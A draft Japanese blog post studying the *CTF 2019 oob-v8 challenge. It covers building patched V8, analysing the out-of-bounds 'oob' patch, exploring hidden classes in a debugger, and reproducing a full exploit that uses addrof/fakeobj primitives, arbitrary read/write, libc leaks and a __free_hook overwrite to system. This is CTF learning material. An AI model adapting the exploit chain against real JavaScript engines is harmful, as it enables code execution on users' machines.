+++
title = "[*CTF 2019] oob-v8 のエクスプロイトを読む"
date = "2023-10-22"
tags = [
    "ctf",
    "security",
]
draft = true
+++

#### これは
*CTF 2019で出題されたoob-v8という問題のエクスプロイトを読んでみました。
これはv8のエクスプロイトを理解するために試行錯誤した記録です。

#### v8のビルド
ビルドはDockerで行いました。利用したイメージは`ubuntu:18.04`です。
```bash
# install dependencies
apt update && apt install curl git python3

# install depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools
export PATH=$PATH:/home/mute/depot_tools/
cd depot_tools && git checkout 8aa9d62e8ecce56cd1054bd8c2dd72ba02c7bb04

# download patch
curl https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz -O Chrome.tar.gz
tar xvf Chrome.tar.gz

# build v8
fetch v8 && cd v8
./build/install-build-deps.sh
git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
gclient sync
git apply ../Chrome/oob.diff
./tools/dev/v8gen.py x64.release
ninja -C ./out.gn/x64.release
./tools/dev/v8gen.py x64.debug
ninja -C ./out.gn/x64.debug
```

これが終了すると、以下のディレクトリに成果物が出力されます。

- `./v8/out.gn/x64.release`
- `./v8/out.gn/x64.debug`


出力された実行ファイルが動くことを確認できました。

```bash
$ ./v8/out.gn/x64.debug/d8 --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> a = 1
1
d8> %DebugPrint(a)
DebugPrint: Smi: 0x1 (1)

1
d8>
```

#### パッチ
パッチの全体としては以下の通りです。

```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

このパッチは以下の動作をするようなものであることが分かりました。

- Array.prototypeにoobというメソッドを追加するものである。
- 引数が渡されない場合は、array[array.length]が返される。
- 引数が1つの場合は、array[array.length]に引数が代入される。

#### 方針
配列は0から始まるので、array[array.length]への書き込みは、領域外への書き込みとなりそうです。この領域外とはいったい何なのでしょうか？

```
DebugPrint: 0x3d7d4d590581: [JSArray]
 - map: 0x09fad1d42ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1b8588c51111 <JSArray[0]>
 - elements: 0x3d7d4d590561 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x231b5e600c71 <FixedArray[0]> {
    #length: 0x0bbf1b4c01a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x3d7d4d590561 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
```

```
gef➤  x/10gx 0x3d7d4d590561-1
0x3d7d4d590560: 0x0000231b5e6014f9      0x0000000200000000 <-- FixedDoubleArray (?)
0x3d7d4d590570: 0x3ff199999999999a      0x400199999999999a
0x3d7d4d590580: 0x000009fad1d42ed9      0x0000231b5e600c71 <-- JSArray (?)
0x3d7d4d590590: 0x00003d7d4d590561      0x0000000200000000
0x3d7d4d5905a0: 0x0000231b5e600941      0x0000000e4bc311de
gef➤  p/f 0x3ff199999999999a
$9 = 1.1000000000000001
gef➤  p/f 0x400199999999999a
$10 = 2.2000000000000002
gef➤
```

elementsの後ろを見てみると、`0x000009fad1d42ed9`というアドレスを指していることが分かります。
これは%DebugPrintしたときに出力されたmapと同じアドレスです。
このmapという構造体を書き換えることでなにか不正な動作を引き起こせそうです。

#### Maps (Hidden Class)
以下の記事を読んで `Maps (Hidden Class)` について学びました。

- https://v8.dev/blog/fast-properties
- https://v8.dev/docs/hidden-classes
- https://engineering.linecorp.com/ja/blog/v8-hidden-class

自分は以下のようなことだけ理解しました。
- プロパティを効率的に管理するための構造体である。( [source](https://github.com/v8/v8/blob/main/src/objects/map.h#L130-L209) )
- この構造体にはプロパティの名前、属性、オフセットなどが保存されている。
- プロパティが変更されるたび、新たなHidden Classへの遷移が起こる。

%DebugPrintを使いながら、以下を確認しました。
- 同じプロパティを持つオブジェクトのmapは同じアドレスを指していること
- プロパティを変更するとアドレスが変わること

<details>

```bash
$ ./v8/out.gn/x64.debug/d8 --allow-natives-syntax
V8 version 7.5.0 (candidate)
d8> var a = {}
undefined
d8> %DebugPrint(a)
DebugPrint: 0x2f0c9ed8dd11: [JS_OBJECT_TYPE]
 - map: 0x0e89121c0459 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - elements: 0x18cbb6240c71 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x18cbb6240c71 <FixedArray[0]> {}
0xe89121c0459: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 56
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 4
 - enum length: invalid
 - back pointer: 0x18cbb62404d1 <undefined>
 - prototype_validity cell: 0x316f85280609 <Cell value= 1>
 - instance descriptors (own) #0: 0x18cbb6240259 <DescriptorArray[0]>
 - layout descriptor: (nil)
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - constructor: 0x37e833bc20c9 <JSFunction Object (sfi = 0x316f85289cf9)>
 - dependent code: 0x18cbb62402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{}
d8> var b = {}
undefined
d8> %DebugPrint(b)
DebugPrint: 0x2f0c9ed90271: [JS_OBJECT_TYPE]
 - map: 0x0e89121c0459 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - elements: 0x18cbb6240c71 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x18cbb6240c71 <FixedArray[0]> {}
0xe89121c0459: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 56
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 4
 - enum length: invalid
 - back pointer: 0x18cbb62404d1 <undefined>
 - prototype_validity cell: 0x316f85280609 <Cell value= 1>
 - instance descriptors (own) #0: 0x18cbb6240259 <DescriptorArray[0]>
 - layout descriptor: (nil)
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - constructor: 0x37e833bc20c9 <JSFunction Object (sfi = 0x316f85289cf9)>
 - dependent code: 0x18cbb62402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{}
d8> b.x = 0
0
d8> %DebugPrint(b)
DebugPrint: 0x2f0c9ed90271: [JS_OBJECT_TYPE]
 - map: 0x0e89121caae9 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - elements: 0x18cbb6240c71 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x18cbb6240c71 <FixedArray[0]> {
    #x: 0 (const data field 0)
 }
0xe89121caae9: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 56
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 3
 - enum length: invalid
 - stable_map
 - back pointer: 0x0e89121c0459 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x37e833be1689 <Cell value= 0>
 - instance descriptors (own) #1: 0x2f0c9ed90519 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - prototype: 0x37e833bc2091 <Object map = 0xe89121c0229>
 - constructor: 0x37e833bc20c9 <JSFunction Object (sfi = 0x316f85289cf9)>
 - dependent code: 0x18cbb62402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{x: 0}
```

</details>

#### エクスプロイト
// TODO フルエクスプロイトを読んで、何をやってるのか理解する

こちらのブログで解説されている

cf. https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
```js
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var obj = {"A":1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

console.log("[+] Float array map: 0x" + ftoi(float_arr_map).toString(16));
console.log("[+] Object array map: 0x" + ftoi(obj_arr_map).toString(16));

function addrof(in_obj) {
    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    obj_arr.oob(float_arr_map);

    // Get the address by accessing index 0
    let addr = obj_arr[0];

    // Set the map back
    obj_arr.oob(obj_arr_map);

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    float_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    float_arr.oob(obj_arr_map);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(float_arr_map);

    // Return the object
    return fake;
}

// This array is what we will use to write to arbitrary memory addresses
var arb_rw_arr = [float_arr_map, itof(0x0000000200000000n), 1, 0xffffffff];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers, so if the addr isn't tagged, we tag it
    if (addr % 2n == 0)
	addr += 1n;
    
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

var test = new Array([1.1, 1.2, 1.3, 1.4]);

var test_addr = addrof(test);
var map_ptr = arb_read(test_addr - 1n);
var map_sec_base = map_ptr - 0x2f79n;
var heap_ptr = arb_read(map_sec_base + 0x18n);
var PIE_leak = arb_read(heap_ptr);
var PIE_base = PIE_leak - 0xd87ea8n;

console.log("[+] test array: 0x" + test_addr.toString(16));
console.log("[+] test array map leak: 0x" + map_ptr.toString(16));
console.log("[+] map section base: 0x" + map_sec_base.toString(16));
console.log("[+] heap leak: 0x" + heap_ptr.toString(16));
console.log("[+] PIE leak: 0x" + PIE_leak.toString(16));
console.log("[+] PIE base: 0x" + PIE_base.toString(16));

puts_got = PIE_base + 0xd9a3b8n;
libc_base = arb_read(puts_got) - 0x809c0n;
free_hook = libc_base + 0x3ed8e8n;
system = libc_base + 0x4f440n;

console.log("[+] Libc base: 0x" + libc_base.toString(16));
console.log("[+] __free_hook: 0x" + free_hook.toString(16));
console.log("[+] system: 0x" + system.toString(16));

console.log("[+] Overwriting __free_hook to &system");
arb_write(free_hook, system);

console.log("xcalc")
```

参考資料
- https://blog.ssrf.in/post/webkit-exploit/
- https://blog.ssrf.in/post/webkit-memory-corrupution/
- https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/
- https://liveoverflow.com/just-in-time-compiler-in-javascriptcore-browser-0x03/
- https://liveoverflow.com/webkit-regexp-exploit-addrof-walk-through-browser-0x04/
- https://liveoverflow.com/the-fakeobj-primitive-turning-an-address-leak-into-a-memory-corruption-browser-0x05/

#### まとめ
他のWriteUpを読みながらなんとか再現できた
一人ではとんでもない時間がかかってしまいそう

#### 参考資料
- https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/